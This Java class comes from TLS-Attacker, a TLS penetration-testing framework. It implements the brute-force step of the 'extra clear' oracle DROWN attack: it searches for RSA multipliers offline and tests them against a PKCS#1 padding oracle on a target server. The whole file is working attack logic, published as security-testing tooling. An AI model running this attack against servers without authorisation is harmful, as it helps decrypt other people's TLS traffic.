/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl.drown;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.ExtraClearDrownOracle;
import java.math.BigInteger;
import java.util.concurrent.Callable;

/**
 * Callable implementing the brute-force part of step 2 of an "extra clear"
 * oracle DROWN attack: Finding a suitable multiplier s and testing it both
 * offline and using the oracle, as described in appendix A.3 of the DROWN
 * paper.
 */
class ExtraClearStep2Callable implements Callable<BigInteger> {

    private ExtraClearDrownOracle oracle;
    private byte[] shiftedOldCiphertext;
    private int l_m;
    private BigInteger e;
    private BigInteger N;
    private BigInteger sCandidate;
    private BigInteger sCandidateStep;
    private BigInteger sMax;
    private BigInteger shiftedOldPlaintext;

    public ExtraClearStep2Callable(ExtraClearDrownOracle oracle, byte[] shiftedOldCiphertext, int l_m, BigInteger e,
            BigInteger N, BigInteger initialSCandidate, BigInteger sCandidateStep, BigInteger shiftedOldPlaintext) {
        this.oracle = oracle;
        this.shiftedOldCiphertext = shiftedOldCiphertext;
        this.l_m = l_m;
        this.e = e;
        this.N = N;
        this.sCandidate = initialSCandidate;
        this.sCandidateStep = sCandidateStep;
        this.shiftedOldPlaintext = shiftedOldPlaintext;

        sMax = BigInteger.valueOf(2).modPow(BigInteger.valueOf(30), N);
    }

    @Override
    public BigInteger call() {
        while (sCandidate.compareTo(sMax) <= 0) {
            // Offline part: Find a suitable s without querying the oracle
            // Appendix A.3 of the DROWN paper describes a way to speed this
            // up using lattices, but I don't know enough about lattices :-(
            byte[] plaintextCandidate;
            do {
                if (Thread.currentThread().isInterrupted()) {
                    return null;
                }

                sCandidate = sCandidate.add(sCandidateStep);
                plaintextCandidate = ArrayConverter.bigIntegerToByteArray(
                        shiftedOldPlaintext.multiply(sCandidate).mod(N), l_m, false);
            } while ((plaintextCandidate.length > l_m) || (plaintextCandidate[0] != 0x00)
                    || (plaintextCandidate[1] != 0x02));

            // Online part: Check if s is really suitable using the oracle
            byte[] cipertextCandidate = ArrayConverter.bigIntegerToByteArray(
                    sCandidate.modPow(e, N).multiply(new BigInteger(shiftedOldCiphertext)).mod(N), l_m, true);
            if (oracle.checkPKCSConformity(cipertextCandidate)) {
                return sCandidate;
            }
        }
        return null;
    }

}
